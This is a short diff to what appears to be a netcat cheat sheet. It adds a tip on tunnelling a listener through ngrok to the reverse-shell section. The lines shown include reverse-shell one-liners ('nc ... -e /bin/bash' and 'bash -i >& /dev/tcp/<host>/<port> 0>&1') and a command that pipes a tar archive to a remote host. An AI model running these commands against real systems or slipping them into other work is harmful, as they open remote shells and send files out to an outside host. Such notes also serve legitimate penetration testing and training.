@@ -15,6 +15,6 @@ Transfer compressed file:
     sender:   tar cfp - <dir> | gzip -c | nc -w 3 <host> <port>
 
 Reverse shell with netcat/bash:
-    client: nc –lvp <port>
+    client: nc –lvp <local_port> (Use 'ngrok tcp <local_port>' to create TCP tunnel to local host)
     server: nc <host> <port> –e < /bin/bash | cmd.exe > 
-    server: bash -i >& /dev/tcp/<host>/<port> 0>&1
+    server: bash -i >& /dev/tcp/<host>/<port> 0>&1`
